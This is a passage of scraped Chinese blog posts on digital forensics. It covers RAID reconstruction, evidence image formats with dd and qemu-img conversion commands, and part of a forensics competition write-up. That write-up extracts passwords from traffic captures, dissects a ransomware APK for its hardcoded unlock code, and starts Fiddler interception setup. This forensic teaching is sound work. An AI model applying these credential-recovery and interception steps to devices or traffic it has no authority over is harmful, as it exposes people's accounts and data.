D6 P2 D7 D8 3 P3 4 P4 5 P5 其实就是每行从0依次由低到高填入\n同步（对称） 下一个数据条带的起始数据块紧跟在当前条带校验块所在的磁盘之后，如果校验块在最后一个盘，则起始数据块回到0号盘\n条带号 Disk0 Disk1 Disk2 Disk3 0 D0 D1 D2 P0 1 D4 D5 P1 D3 2 D8 P2 D6 D7 3 P3 4 P4 5 P5 先判断下一个条带的校验块位于哪个磁盘，然后将数据写入校验块所在的磁盘的下一个磁盘\n之后向高号盘写入，直至该条带内编号最大的数据块写满后，再回到同条带内的0号盘写入，直至写满条带\n比如条带三，因为校验块是Disk1，数据写入顺序就是D6（Disk2）-\u0026gt; D7（Disk3）-\u0026gt; D8（Disk0）\n至此，我们就掌握了完整的RAID5写入标准数据与校验数据的方式\nRAID6：双分布式奇偶校验 在RAID5的基础上增加了第二个独立的校验块，并将两种校验信息都交错分布在所有磁盘上\n有两组独立的校验信息，占用的总空间等于两块磁盘的容量，所以可用空间是(N-2)*S\n至少需要4块磁盘，可以容忍两块磁盘同时损坏\n但也因为要进行两次校验计算，RAID6的写入性能，尤其是小数据块的随机写入，通常低于RAID5\nRAID10 (1+0) 先将磁盘两两配对做RAID1（镜像），然后再将这些镜像对组合成一个RAID0（条带化）\n兼具RAID1的高可靠性和RAID0的高性能，只要每个镜像对中至少有一块磁盘正常，数据就不会丢失\n但成本高，且磁盘利用率和RAID1一样，只有50%\neg：\n条带号 Disk0 Disk1 Disk2 Disk3 1 D0 D0 D1 D1 2 D2 D2 D3 D3 Disk0/1是镜像组1，Disk2/3是镜像组2\n使用RAID0对镜像组条带化后，多组镜像同时读写\nRAID50 (5+0) 先将磁盘分组构建多个RAID5阵列，再将这些RAID5阵列组合成一个RAID0\n每个子RAID5组都允许坏一块盘，提供了比单个RAID5更高的性能和更好的容错能力\n可用空间是K*(M-1)*S，K是RAID5子阵列的数量，M是每个子阵列中的磁盘数量\neg：\n条带号 Disk0 Disk1 Disk2 Disk3 Disk4 Disk5 1 D0 D1 P0 D3 D4 P1 2 D5 P2 D6 D7 P3 D8 前3块盘是RAID5组1，后3块盘是RAID5组2\nRAID0跨两组条带化后，多组并行，提高性能\nRAID60 (6+0) 先将磁盘分组构建多个RAID6阵列，再将这些RAID6阵列组合成一个RAID0\n每个子RAID6组都允许坏两块盘，提供了极高的性能和顶级的容错能力\n可用空间是K*(M-2)*S\neg：\n条带号 Disk0 Disk1 Disk2 Disk3 Disk4 Disk5 Disk6 Disk7 1 D0 D1 P0 Q0 D4 D5 P1 Q1 2 D2 P2 Q2 D3 D6 P3 Q3 D7 每组4块盘，RAID0跨两组条带化，提升性能\n上面三种方式和RAID0组合都是为了在高容错的基础上提高读写效率\nRAID的实现模式 软件RAID 所有数据和校验运算都由CPU负责，成本低廉，无需额外硬件，但会占用CPU资源，影响系统性能\n例如操作系统内置的RAID功能，或者主板芯片组提供的RAID功能，都是软件RAID\n不过主板损坏后，可能难以找到同款主板来重建RAID\n硬件RAID 通过一块专用的RAID控制器卡来实现，该卡上有自己的处理器（称作ROC, RAID-on-Chip）、缓存和BIOS，独立处理所有RAID运算，对主CPU透明\n性能高，不占用主机CPU资源，通常有缓存和备用电池以防掉电数据丢失，可靠性高，易于迁移，但成本较高\nRAID重组 要成功手动重组一个RAID阵列，必须确定以下三个东西：\nRAID类型 条带大小 循环方式 2023美亚 检材给了三个镜像：\nUSF 这个工具强到离谱，速度快而且非常自动化，非常推荐使用\n自动重组 打开三个镜像：\n在左侧显示已经添加后，点击reflash刷新，可以看已经自动重组完成了：\n其中三个NAS磁盘都被划分成了一模一样的三个分区：\nMirror component (Ext2/3/4) partition\nRAID1阵列的组件，用于存放NAS的操作系统\nSWAP partition\n用作Linux系统的交换分区（虚拟内存），在NAS中，这个分区通常也会被设置为一个RAID1阵列\nRAID5 component partition\nRAID5阵列的组件\n这三块5.40GB硬盘组成的RAID5阵列，可用容量为(3-1) * 5.40 GB = 10.80 GB，也就是组好的SG7:2的大小\n而下面重组完成的卷大小是10GB，非常合理\n右键对应的RAID分区，选择查看信息，可以看到具体的RAID情况：\n查看重组后的RAID5信息：\n在USF里面也能直接查看文件系统：\n手动重组 除了自动分析，也能使用手动分析重组功能：\n导出磁盘 选择一比一复制：\n火眼可以正常解析：\n但不知道为什么不能进行火眼仿真\nR-Studio 点击打开镜像，把三个镜像都导进去，然后再使用右上角的RAID功能：\n到这一步不知道为什么实在卡的不行，暂时缓一下，下次重启电脑后再更新（\n美亚计算机取证大师 自动重组 新建案例（注意这里选择添加磁盘镜像进行分析，而不是直接选择RAID重组）：\n点击下一步后会自动识别出有动态磁盘，选择继续分析：\n进入案件后，在证据文件这里找到RAID5，已经自动识别出来了：\n右键选择扫描磁盘结构：\n扫完之后会多出来两个卷，就是存储了内容的卷了：\n点击卷就能查看文件系统：\n看别人说其实还需要右键RAID5，选择RAID重组：\n📝 Note 这里也能看见三个盘的起始的偏移量都是4832886784字节，条带大小是128扇区，符合RAID5的规范\n但回顾之前使用USF的分析结果，那边说偏移量是9439232扇区，64KB\n其实这里涉及到计算：一个扇区的大小是512字节\n（以防你是跳着看的：扇区 ）\n由此能计算出他们其实是一样的：\n偏移量 = 9439232扇区*512字节 = 4832886784字节\n条带大小 = 128扇区*512字节 = 65536字节 = 64K字节\n据说重组后才能看到文件系统，不过我做的过程里只需要扫描磁盘结构之后就能看到了，不知道这一步是什么意思，可能是方便之后导出镜像？\n总之以后注意一下，遇到问题再重组一下\n导出镜像 右键RAID5选择制作镜像文件：\n这里可以选择镜像文件的格式：\n导出后还会附赠一个说明文档：\n火眼能够正常解析：\n弘连火眼证据分析 需要在工具箱里面下载使用：\n使用信息查询能快速分析RAID的各种信息：\n这里也是使用扇区来表示偏移量的\n使用重组功能，勾选自动解析，就能自动重组了：\n导出的文件是.001格式，会放在一个火眼生成的虚拟驱动器里：\n这个文件也是能被正常解析的：\n比较坑的是生成的虚拟驱动器想要关掉很麻烦，火眼没有这个功能，windows的磁盘管理也看不见这个驱动器\n试了好几次，我的步骤是：\n1.手动删除生成的镜像（剪切也行，反正别让他在里面，让这个虚拟驱动器里面没有东西）\n2.在重组页面点击“清空”，把拖进去重组的镜像都删除\n3.再次点击生成文件，此时提示找不到信息，虚拟驱动器也随之消失了\n据客服所说，关掉RAID重组工具页面就会自动卸载，不过我没试过\n2019 给出的是四个机械硬盘镜像\nFTK + 美亚取证大师 没找到其他办法，可能是因为这是硬RAID？\n使用FTK挂载这四个镜像（选择每个盘的.E01就可以，后面的会自动识别的）：\n挂载完成后可以在检材目录下看见一个.adcf文件：\n这个.adcf文件是FTK创建的缓存/差异文件\n使用writable(可写入)模式时，为了保护原文件不被修改，FTK会把所有写入操作都记录在这个文件中\n挂载过程里你可能可能看见这样的错误提示：\n错误提示表明这个已经存在的HDD1.E01.adcf文件已经损坏，删掉再挂载即可，会生成一个新的\n不知道为什么，挂载之后在文件管理器可以看见，但在磁盘管理看不见这两个驱动器：\n无伤大雅，美亚是可以识别到的：\n全都勾选后，自动计算序列，要一点时间：\n只有一种可能啊，那就是正确的了：\n双击应用这个序列：\n已经还原了：\n这几个磁盘都很大，或许是挂载之后让美亚重组更方便了，才能如此迅速扫出来\n","date":"2025-09-28T22:52:36+08:00","image":"http://picture.928330.xyz/typora/56ab540a33f6eab79937c1187dd72855.jpg","permalink":"https://blog.928330.xyz/p/raid/","title":"RAID"},{"content":"在电子取证过程中拿到的检材形式各异，它们可能是从硬盘完整复制下来的镜像文件，也可能是RAID阵列中的多个磁盘，或者是手机的逻辑备份，而知道这些检材是是什么怎么用，才是启动分析的第一步\n以弘连火眼证据分析软件为例，选取检材的时候会看见如下选项：\n这些都是什么呢？我们先大致说一下：\n镜像文件\n最常见的证据形式，是物理存储的数字副本，单个的手机、计算机都可能是这个\n多镜像文件\n当单个镜像文件被分割成多个小文件时，就会变成多镜像，有点像分卷压缩\n物理磁盘\n直接对连接到取证机的原始硬盘或SSD进行分析，或者挂载镜像为系统盘后分析\n文件集合\n非完整的磁盘镜像，仅包含从源设备中提取的特定文件和文件夹，比如手机系统的备份\n移动设备\n由于要使用雷电手机快取软件，我至今没有用过这个功能\u0026hellip;\u0026hellip;\n不过好像是连接手机、平板等进行数据提取分析\n磁盘阵列\n对由多块硬盘组成的RAID进行重组和分析\n下面我们系统介绍一些检材常用的格式，以及转换方法\n计算机取证镜像 标准镜像文件式 原始镜像 纯粹的位对位（bit-by-bit）副本，文件大小与源磁盘/分区容量完全一致\n无元数据、无压缩、无加密（因为本身就是字节流，没有这些标识概念），但是利用命令和工具可以做到\n所以，就算把他们后缀名去掉，使用方法也是一样的\n.dd 这个扩展名源自Unix/Linux系统下的**dd(dataset definition，数据集定义)**命令，它是制作原始镜像最经典、最基础的工具，因此.dd成为了原始镜像的代名词\n命令行制作：\ndd if=/dev/sda of=image.dd bs=4M conv=noerror,sync 意思是把整块硬盘/dev/sda按照4MB为单位复制到image.dd文件里，如果遇到坏扇区，不报错不中止，而是用0填充，保证镜像完整且和原盘大小一致\n几乎所有主流取证工具都支持创建和导出为.dd，非常的常见\n.img / .raw / .bin 这些都是描述性的扩展名，img代表 \u0026ldquo;镜像\u0026rdquo;，raw代表 \u0026ldquo;原始\u0026rdquo;，bin代表 \u0026ldquo;二进制文件\u0026rdquo;\n它们在功能和结构上与.dd文件完全相同，都是指原始的、逐位的副本，只是使用场景和工具不同叫法也不同\n这些扩展名实际能用于很多场景，遇见了不确定的话就一个个尝试吧，能分析出来就行\n封装镜像 本质上也包含了原始磁盘或分区的bit-by-bit数据，但是采用了封装数据 + 元数据（采集者、采集时间、硬盘序列号、哈希值）的形式\n也正因此，他们支持压缩、加密等形式来节约空间，支持分卷存储大型镜像文件，部分可随机访问（如AFF）\n.E01, .Ex01 由EnCase Forensic开发的证据文件格式，已成为事实上的行业标准，也就是说法庭认可度最高！\n.Ex01是其更新的“专家见证”格式，支持更强的AES-256加密和更大的文件大小\n它主要通过EnCase Forensic软件制作，同时，绝大多数第三方取证工具也都支持直接采集为 .E01 格式以保证兼容性\n.aff / .aff4(.af4) .aff，全称是高级取证格式 (Advanced Forensic Format)，它是一个开源项目，旨在克服.dd格式无元数据和.E01格式专有的缺点\n而.aff4是.aff的第四代版本，是一个经过大幅重新设计的格式，可以存储多种数据流，包括磁盘映像、内存映像、逻辑文件，甚至是网络流量，也被简写成.af4\n他们都是通过支持AFFLIB库的工具制作的，比如Evimetry等\n.ad1 由AccessData开发的证据文件格式，全称AccessData Evidence Container，主要用于他的产品FTK系列\n大多数主流取证软件都能识别导入.ad1文件\n多镜像文件 扩展名可能是上面的任意一种+序列号\n当单个大镜像被分割存储时，会看到一组序列文件：\n可能是disk_part1.dd、disk_part2.dd、 disk_part3.dd这样的原始文件分卷\n也能是case.E01、case.E02、case.E03，或者case001.E01、case002.E01、case003.E01这样的封装镜像分卷\n它们必须放在一起才能被完整加载，也就是之前提到的“多镜像文件”这一栏\n物理磁盘与磁盘阵列 物理磁盘 这不是一种文件格式，而是一种证据源\n比如把一块嫌疑人电脑里的硬盘拔下来，接到自己电脑，或者某块硬盘里面有着线索，直接对他分析\n也有可能是使用FTK等工具挂载镜像成为系统盘\n磁盘阵列 (RAID) RAID（Redundant Array of Independent/Inexpensive Disks，独立冗余磁盘阵列）是一种将多块物理磁盘组合成一个逻辑磁盘的技术，用于提升容错能力，抗数据丢失\n遇到这类检材，一般是考察RAID的磁盘重组，也就是把分散的块组合成可以\n这部分内容有点多，后面单开一篇学习\n逻辑镜像 与获取整个磁盘不同，这类检材只包含从源系统中选择性提取的部分数据（特定文件和文件夹）\n.L01 / .Lx01 同样来自EnCase，是它的逻辑证据文件格式\n在EnCase软件中选择要导出的文件条目，再通过添加至逻辑证据文件功能创建.L01文件\n.ad1 嗯，就是之前提到过的那个\n使用FTK软件时，选择获取逻辑证据，然后添加特定的文件/文件夹就能创建.ad1文件\n.zip / .tar / .rar 其实就是手动打包一系列要分析的文件，不使用专业软件而已\n系统备份 .tib / .tibx 由Acronis True Image软件创建的备份镜像格式\n.tib是旧版格式，而.tibx是较新版本引入的格式，提供了更强的性能和可靠性\n这类文件包含了整个磁盘或分区的完整快照，可以通过Acronis软件进行恢复或挂载浏览\n.gho 来自Symantec Ghost软件的磁盘克隆镜像\n在21世纪初非常流行，现在虽然少见，但在一些旧的系统备份中仍可能遇到\n.bkf 由旧版Windows（如 XP, Server 2003）自带的NTBackup工具创建的备份文件\n它主要用于备份文件和系统状态，而不是完整的磁盘镜像\n.bak 通用的备份文件扩展名，它没有统一的格式标准，具体内容取决于创建它的应用程序，不过一般是移动设备\n虚拟磁盘镜像 虚拟机镜像是案件中的常见角色，它们本身就是完整的操作系统环境\n它们一样能被当成整个的镜像文件被分析\n.vmdk 全称Virtual Machine Disk\n是VMware公司为其虚拟化产品开发的格式，在VMware产品中创建新虚拟机时自动生成\n也可以使用其命令行工具vmware-vdiskmanager.exe手动创建\n.vhd / .vhdx 全称Virtual Hard Disk\n.vhd源于Connectix公司，后被微软收购用于Virtual PC\n.vhdx是其现代化的后继者，随Windows Server 2012推出，支持更大容量和更好的性能\n在Windows的Hyper-V管理器或“磁盘管理”工具中（操作 -\u0026gt; 创建VHD）可以直接创建\n.avhd / .avhdx 这是Microsoft Hyper-V的快照文件\n当为虚拟机创建快照后，系统会创建一个.avhd(x)文件，之后所有对虚拟磁盘的增量修改都会写入这个文件，而原始的.vhd(x)文件则保持只读\n将快照文件与父磁盘文件（.vhd/.vhdx）合并，才能看到虚拟机在快照时间点的完整状态\n.vdi 全称Virtual Disk Image\n是Oracle公司为其开源虚拟化软件VirtualBox开发，在VirtualBox中创建新虚拟机时自动生成\n.qcow / .qcow2 / .qcow3 .qcow全称QEMUCopy-On-Write，来自开源的QEMU项目（后面会提到）\n而.qcow2是第二版，也是目前的主流，.qcow3则是实验性版本，同样不太使用\n主要通过qemu-img命令行工具创建，比如：\nqemu-img create -f qcow2 image.qcow2 20G 意思是创建一个大小为20GB、格式为qcow2的虚拟磁盘文件image.qcow2\n.dmg / .sparseimage .dmg全称Apple Disk Image，是macOS下标准的磁盘映像格式，用于软件分发和数据归档，类似于Windows下的ISO（不过ISO没办法被火眼解析，真是很奇怪了）\n**.sparseimage**是.dmg的一种稀疏捆绑磁盘映像，它的特点是文件大小会根据实际存储数据的增多而动态增长，而不是一开始就占用全部分配空间，非常节省存储，类似growable的.vmdk文件\n这两种格式都是通过macOS系统自带的磁盘工具应用程序创建\n.zvhd2 这是Parallels Desktop虚拟机软件使用的专有虚拟磁盘格式\nParallels是一款在macOS上运行Windows和其他操作系统的流行软件，虚拟机硬盘会以.zvhd2格式存储\n.xva 全称Xen Virtual Appliance，是Citrix XenServer/XCP-ng虚拟化平台的虚拟机导出格式\n它不仅仅是一个磁盘镜像，而是一个包含了虚拟机完整配置（CPU、内存、网络）和所有虚拟磁盘（VHD格式）的归档包（实际上是一个TAR归档文件），用于虚拟机的备份和迁移\n内存镜像 .mem / .raw 通用描述性名称，代表原始内存数据\n使用专业的内存获取工具，如DumpIt等能够制作，在Linux中也可从/dev/mem等设备文件转储\n这是最为常见的一类，使用频繁\n.dmp 常见于Microsoft Windows系统崩溃（也就是蓝屏）时由系统自动生成MEMORY.DMP\n也可以通过任务管理器（针对单个进程）或WinDbg等调试工具手动创建\n.vmem VMware的内存镜像格式\n这是虚拟机的内存文件，当一个正在运行的VM被挂起时，其内存内容会被写入.vmem文件\n.vmsn 同样被使用于VMware\n为虚拟机创建一个快照时生成，.vmsn文件保存了虚拟机在快照那一刻的运行状态，其中就包含了内存数据\n移动设备镜像 iOS 文件夹集合 就是文件的集合，没有任何格式\n通过iTunes或Finder连接执行备份操作时创建，部分第三方取证工具也能调用此协议进行提取\n主文件夹名通常是设备的UUID（一长串十六进制字符），内部包含大量以两位哈希值命名的子文件夹和散列文件名，里面有Info.plist，Manifest.db，Status.plist等关键索引文件\n看到这种结构，即可100%确定为iOS的官方备份\n.zip / .tar 移动取证工具供应商，如Cellebrite, Grayshift, Magnet Forensics等都能制作，或者使用别的办法直接导出\n解压后会看到完整的iOS文件系统目录结构，如/private/var/等\n这比上面备份操作得到的集合包含更多系统文件、应用缓存和数据库\n.bin / .raw / .dd / .img 和计算机镜像文件一样，是对闪存芯片最底层的、逐位的完整复制\nAndroid .ab 全称Android Backup\n在电脑上通过Android调试桥(ADB)工具执行adb backup命令创建\n.zip / .tar 和ios一样来源于移动取证工具供应商，或者通过完全root的手段导出\n压缩包内包含了/data分区的完整目录结构，也就是很多com.开头的包，包含了所有用户安装的应用和数据\n.bin / .raw / .dd / .img 无需多言\n安卓模拟器镜像 模拟器本质是运行在PC上的虚拟机\n多数模拟器既可以直接获取其运行中的磁盘文件，也可以处理其专有的备份文件\n备份文件通常是包含了磁盘文件的压缩包，如同.apk格式一样，改后缀名就能解压得到其中的虚拟磁盘文件\n需要注意的是，不同模拟器使用的虚拟磁盘格式也有出入\n雷电模拟器 虚拟磁盘格式：.vmdk\n磁盘文件位于安装目录的vms文件夹下，点进对应模拟器也能得到.vmdk文件\n备份格式：.ldbk\n.ldbk文件是一个ZIP压缩包，修改扩展名为.zip后解压，就能得到data.vmdk和sdcard.vmdk两个虚拟磁盘文件\nMuMu模拟器（v12） 虚拟磁盘格式：.vdi\n磁盘位置和雷电模拟器如出一辙，位于安装目录的vms文件夹下，不多赘述\n备份格式：.mumudata\n.mumudata也是一个ZIP压缩包，按同样方法改名解压后可获取.vdi磁盘文件：\n夜神模拟器 虚拟磁盘格式：.vmdk\n不过它的磁盘位置是位于安装目录的BignoxVMS文件夹下：\n备份格式：.npdk\n官方文档说32位是.npbk，64位是.anpbk，我测试下来64位是.npbk，32位没找到下载方式\n解压方式不变：\n逍遥模拟器 虚拟磁盘格式：.vmdk\n它的磁盘位置也不一样，或者说它的文件目录构造就和上面三个不一样\n它的磁盘位于安装目录的\\MEmu\\MemuHyperv VMs文件夹下：\n备份格式：.ova\n解压方式不变：\nBlueStacks(蓝叠5) 虚拟磁盘格式：.vhd、vhdx、.vdi\n它的磁盘位置完全就和上面这些不是一个构造了\n它的虚拟机统一放在安装目录下的Engine文件夹中：\nEngine文件夹下也放置了一些json/cfg格式配置文件，以及Manager和UserData文件夹，所有虚拟机共用\n同时，他的磁盘似乎是分开存储的，fastboot使用的是.vdi，而数据和root使用.vhd和.vhdx\nData.vhdx ≈ 用户数据分区 Root.vhd ≈ 系统分区 fastboot.vdi ≈ fastboot引导镜像 .bstk / .cfg 文件 ≈ 配置与快照 备份格式：文件集合\n蓝叠备份文件不会压缩，而是直接导出一整个原始文件夹，包含Engine文件夹下的所有必要配置：\n格式转换 虚拟磁盘之间转换 命令行工具 —— qemu-img qemu-img 是 QEMU 虚拟化套件中的一个功能极其强大的命令行工具，被誉为虚拟磁盘管理的“瑞士军刀”。它支持几乎所有主流虚拟磁盘格式的读写和转换\n下载地址：QEMU 查看镜像信息 在转换前，最好先用info命令检查源文件的格式和参数\nqemu-img info source_disk.vmdk 输出会显示格式 (file format)、虚拟大小 (virtual size)、物理大小 (disk size) 等信息\n格式转换 基本语法：\nqemu-img convert [options] -f \u0026lt;source_fmt\u0026gt; -O \u0026lt;output_fmt\u0026gt; \u0026lt;source_file\u0026gt; \u0026lt;target_file\u0026gt; 常用参数：\n-p：显示转换进度条 -f \u0026lt;format\u0026gt;：指定源文件格式（通常可自动识别，但显式指定更可靠） -O \u0026lt;format\u0026gt;：指定输出文件格式（必填！） 支持格式 keyword：vmdk, vhdx, vdi, qcow2, raw (对应.dd或.img) 等\n示例：\nvmdk转 vhdx\nqemu-img convert -p -f vmdk -O vhdx source.vmdk target.vhdx 需要注意的是VMware分片vmdk需要用描述文件.vmdk，单独s001.vmdk这样的文件不能直接转换\nvdi 转 vmdk\nqemu-img convert -p -f vdi -O vmdk source.vdi target.vmdk qcow2 转 raw\nqemu-img convert -p -f qcow2 -O raw source.qcow2 target.img raw/dd/img 转 vmdk\nqemu-img convert -p -f raw -O vmdk source.dd target.vmdk 图形化工具 —— StarWind V2V Converter 一款功能强大的免费工具，界面直观，非常轻量化，支持多种物理和虚拟格式的互相转换\n选择要转换的镜像 选择转换目标 growable是动态扩展磁盘，磁盘文件初始体积较小，随着写入数据逐渐增大\nPre-allocated是预分配磁盘，创建时会一次性占用所有空间，性能更稳定，但占用磁盘空间大\nESX是专门为VMware ESX/ESXi虚拟化平台使用的vmdk格式，和Workstation/Player用的vmdk略有不同\n选择虚拟机磁盘接口类型 接下来选择保存位置即可\n图形化工具 —— VMware vCenter Converter VMware官方工具，需要单独下载安装：\n这个软件功能繁多，还能做到物理磁盘到虚拟磁盘的迁移（P2V），由于主题不在此，就不多赘述\n不同镜像格式转换 实际上，使用上面提到过的VMware vCenter Converter就能做到这一点\n先用挂载工具把源镜像挂载为物理磁盘，然后使用VMware vCenter Converter导出为虚拟磁盘即可\n以及使用一些软件，比如火眼仿真提供的gho转vmdk：\n","date":"2025-09-23T20:18:13+08:00","image":"http://picture.928330.xyz/typora/2f56641afcc38e8ed63fa3beb6d312cc.jpg","permalink":"https://blog.928330.xyz/p/%E5%B8%B8%E8%A7%81%E6%A3%80%E6%9D%90%E7%B1%BB%E5%9E%8B/","title":"常见检材类型"},{"content":"不愧是经常做题的人出的题目，水平确实高，题目质量相比去年也提升了很多很多\n美中不足的是我没看见案件背景，感觉就是纯粹的做题\n题目覆盖的知识范围很广，虽然不深，但是都要懂一点，特别是在手机和计算机取证的时候，着实是几步一卡\n服务器取证方面，由于之前做的比较多了，除了k8s坏了做不了部分题目、网站抽风不能访问导致前端网页看不了只能后端php+mysql进行麻烦的分析之外也没遇到什么困难，比较顺利\n总之学到了不少，非常值得做的一套题\n手机 1.登录的直播APP的IDX是什么？[标准格式：25236541] 手机里面一共有两个和直播有关的APP：\n分辨方法可以根据第二题，看看哪个平台有等级就行\n我觉得比较好的办法是注册个账号进去看一眼谁的等级是有\u0026quot;碌碌无为\u0026quot;的，不过这种软件毕竟有很大风险，就算了，当我知道了\n答案肯定是不太正经的烟雨直播\n记住包名，在文件系统里面找到对应的包文件，然后过滤数据库，id大概率是在本地\n因为不知道数据存储位置，只能一个一个看过去，最终在miao.db的login表里面找到了idx字段：\n35248617 2.目前直播的等级名称是什么？[标准格式：碌碌无为] 试了一下login里的密码，登录超时，大概率是加密存储的\n如果上一题注册了账号，就能搜到这个家伙，也当我知道了\n*出乎意料的解法\n可以在小米手机的相册缩略图里面找到主页图片：\ndata.tar/media_435/0/Android/data/com.miui.gallery/files/gallery_disk_cache/full_size/e61ab074425cf3ee2cbc0fc97f448b7f88a359cf646f77a024b87a6d9c8f5d33.0 这样一二两题都很快做出来了\n一无所有 美亚杯2022找快递单也用到了这一招\n3.地图中哪座山有绝望坡？[标准格式：太行山] 武功山 4.手机的历史SIM卡中，中国电信卡的IMSI是多少？[标准格式：123456789] 460115143563428 5.1月22日16：40的会议号是多少？[标准格式：xxx-xxx-xxx] 转换时间戳，因为没有毫秒，就取前面八位数进行搜索\n在搜索结果里面看见一个\u0026quot;startTime\u0026quot;字段：\n点进去一找，果然有meetingNum字段，并且符合格式位数，应该就是他了：\n312118071 app仿真 这是一种很好的办法，简单来说就是还原app状态，直接进去看各种数据，而不是分析文件\n先导出apk，我更建议跳转到源文件导出而不是直接点击右上角的导出：\n直接拖入模拟器就能安装了\n之后在火眼找到检材里面的对应文件，导出整个包：\n注意一定要选择按照原目录结构：\n导出后，把com.netease.yunxin.meeting整个文件放进共享文件夹\n💡 Tip 共享文件夹如何打开：\n虚拟机内的共享目录默认是/mnt/shared/Pictures\n替换掉/data/data路径下的同名文件夹（这里使用mt管理器）：\n长按进行操作：\n给所有文件进行复制并替换操作，然后打开就行了，可能要多等一会\n搞笑的是我这里打开强制要求更新：\n更新之后再进行一次替换，这次就成功了：\n在历史会议里面能找到会议号：\n312118071 6.网易会议中个人会议号是多少？[标准格式：2523654199] 如果app仿真了，很快就能找到：\n2679823922 *其实也可以在之前找会议号的lolg文件里面找到，具体看11题\n7.记账软件中一共记了几笔？[标准格式：9] *这一题同样也能使用app仿真快速做出\n我服了，记录数据的数据库文件竟然不是任何一个常见后缀名\n照常过滤了.db/.sqlite。。。。还有.log和.xml，都没发现任何记账的记录\n最后在data.tar/data_248/com.csmountainaccount.easy/databases目录下发现，有些识别成\u0026quot;文件\u0026quot;的文件也是数据库：\n这个识别出来就是sqlite，真是离了大谱了\n总之在里面找到了记账记录：\n4 *多刷新几次发现他又变成识别出来是数据库文件了，靠，或许以后应该匹配文件名有.db之类的\n8.谁给了机主100000？[标准格式：某某] 同上题数据库：\n勇哥 9.聊天软件是否需要手机号登录？[标准格式：填写是或者否] 找半天不知道聊天软件是什么，直接导出问ai，说盒子IM是聊天软件，查了一下还真是：\n同样也能搜索到登录需要手机号\n是 10.机主的给对方的活有多少钱？[标准格式：53100] 已经有经验了，直接找databases数据库文件夹，第一个就存有聊天记录，果然又是无后缀的：\n复制出来看比较方便：\n30000 11.机主的手机号是多少？[标准格式：13652492155] 感觉之前找东西的时候见过，但是怎么也想不起来了\n现在找不到，只能猜测几个字段硬搜：\n事实证明搜不到，怎么会搜出这么多来的\n*实际上，电话号也可以在之前找会议号的log文件里面找到\n导出搜索phonenumber/number：\n17751125237 而且旁边就是第六题要找的个人会议号，我们也终于知道了他的字段名是privateMeetingNum：\n2679823922 12.手机的IMEI1后四位是多少？[标准格式：2536] 1055 13.手机上一共有几个地图软件？[标准格式：9] 一个个看软件列表就行了，事实证明搜索也能搜出来：\n百度地图、蔚蓝地图、白马地图\n3 不过火眼应该能解析百度地图数据啊，为什么没有呢\n计算机 1.网卡的Mac地址是多少？[标准格式：XX-XX-XX-XX-XX-XX] 火眼识别出来的网络适配器有两张物理网卡，没办法分辨：\n仿真后查看：\n00-0C-29-3F-32-D4 2.系统内部版本号是多少？[标准格式：12345] 18363 3.计算机系统开机密码是多少？[标准格式：根据实际值填写] WAXD9128@ 4.分析计算机检材中手机流量包，请问黑客虚拟身份的密码是什么？[标准格式：x123] 在文档里面找到.saz流量文件，这是Fiddler的流量包：\n我们打开，可以找到login的页面请求，里面有password：\na12345678 5.分析计算机检材中手机流量包，请问黑客人员使用的夜神模拟器的手机型号是什么？[标准格式：XX-X123X] 搜索yeshen，在这些流量里面查看http报文标头：\n让ai分析一下就行：\nSM-G955N 6.分析计算机检材中手机流量包，请问黑客看视频的时间是几月份？[标准格式：1] 搜video，找到的host是抖音，原始数据里面有时间：\n5 7.分析计算机检材中手机流量包，请问“天戮宇宙”出自哪个小说平台？[标准格式：番茄小说网] 搜索book，发现传输类型是image的报文，里面就有天戮宇宙：\n依旧搜索：\n阅文集团 8.请在手机模拟器中勒索apk软件的sha256值是什么？[标准格式：全小写] 被摆了一道，在计算机仿真里面打开夜神模拟器会直接卡死，需要做一些准备工作\n首先要保证虚拟化功能是开启的，在任务管理器性能页面查看：\n其次，需要开启vmware的虚拟化（默认关闭）：\n之后为了防止冲突，还需要关闭本机的虚拟化服务：\n重启电脑，再次进入计算机仿真，打开夜神模拟器：\n我的天啊，怎么还是报错\n最终找到了解决办法，打开管理员权限cmd输入：\nbcdedit /set hypervisorlaunchtype off 显示操作成功之后重启电脑，这样就成了，坏消息是再也用不了WSL了\n更坏的消息是成功进入模拟器也无法找出勒索软件，模拟器似乎是新建的？\n尝试在火眼里面导出.vmdk直接分析，也有问题：\n*正确的做法是寻找夜神模拟器的备份文件（32位是.npbk，64位是.anpbk）\n导出后改成zip解压，就可以得到这个备份文件的.vmdk：\n也可以下载夜神模拟器然后导入，下面是官方文档的介绍：\n把这个.vmdk文件导入火眼，就能得到真正的目标分析的模拟机虚拟磁盘镜像了，也就能找到勒索软件，因为其他两个怎么也不像勒索软件吧，能搜到都是正经的：\n把这个软件导出计算sha256即可\n340bd211955996c5d62bbde94a0bed4eb3a7965b23af52114991bca02346928e 9.接上题，请问勒索apk软件的解锁密码是什么？[标准格式：qwer.com] 先导入雷电模拟器看看怎么个事：\n要我们打开无障碍权限，也是勒索软件的必经之路了：\n不是很友善啊\n这种勒索软件一般是把解锁密码写死在代码里的，把apk导入jadx，全局搜索密码关键字，可以找到一个应该是密码的东西：\n输入anzhuo.com试一下，果然解除勒索锁屏了\nanzhuo.com 10.signed_xz.exe程序SHA1后6位是多少？[标准格式：524c62] 搜一下直接计算：\n8955B1 11.signed_xz.exe程序中的函数名为curl_version_info的函数地址是多少？[标准格式：0c6875c2] 使用IDA分析，左侧搜索函数名：\n0x004393C0 题目0c应该是打错了吧\n12.signed_xz.exe程序中节名为.reloc的虚拟地址是多少？[标准格式：0c526n5624] 很奇怪，我的IDA无法找到.reloc节：\n换成别的PE分析软件（这里使用CFF）就可以：\n0x035B5000 13.请分析检材中澳门新葡京APK其包名是？[标准格式：com.abcd.xxx] 导出用雷电app分析：\ncom.suijideszzuiji.cocosandroid 14.请分析检材中澳门新葡京APK是否加固，加固则说明是什么加固？[标准格式：360加固宝或未加固] 在jadx和DIE检测下都没发现加壳线索，最后发现原来雷电分析的源码分析模块直接就有：\n未加固 15.请分析检材中澳门新葡京APK是否会往手机的SD卡中写入数据，则该权限的名称是？[标准格式：android.xx.xxx] 依旧雷电：\nandroid.permission.WRITE_EXTERNAL_STORAGE 16.请分析检材中澳门新葡京APK登录的api地址。[标准格式：https://www.baidu.com/api/login] 不知道怎么做，代码量太大了，调了几个可疑的问ai也没有结果\n*需要抓包\n由于雷电模拟器+雷电智能分析app抓包；总是闪退（暂未找到解决办法），所以得换个办法\n这里选择跟着网上教程走一遍，使用Fiddler对app进行抓包\n⚠️ Warning 接下来最好全程将电脑连接至手机使用流量\nFiddler设置与证书导出 下载好fiddler之后，点击工具（tools） -\u0026gt; 